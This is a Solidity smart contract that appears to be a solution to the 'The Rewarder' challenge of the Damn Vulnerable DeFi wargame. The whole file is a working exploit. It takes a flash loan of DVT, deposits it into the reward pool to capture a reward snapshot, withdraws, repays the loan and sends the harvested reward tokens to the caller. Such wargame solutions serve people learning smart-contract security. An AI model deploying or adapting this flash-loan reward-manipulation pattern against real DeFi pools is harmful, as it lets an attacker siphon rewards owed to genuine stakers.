// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './TheRewarderPool.sol'; // Includes DVT and RewardToken
import './FlashLoanerPool.sol';

contract AttackerTheRewarder {
    DamnValuableToken public DVT;
    RewardToken public rewardToken;
    TheRewarderPool public rewarderPool;
    FlashLoanerPool public flashLoanerPool;

    constructor(address _DVT, address _rewardToken, address _rewarderPool, address _flashLoanerPool) {
        DVT = DamnValuableToken(_DVT);
        rewardToken = RewardToken(_rewardToken);
        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
    }

    function attack(uint256 _amount) public {
        flashLoanerPool.flashLoan(_amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 _amount) public {
        DVT.approve(address(rewarderPool), _amount);
        rewarderPool.deposit(_amount);
        rewarderPool.withdraw(_amount);
        DVT.transfer(address(flashLoanerPool), _amount);
    }
}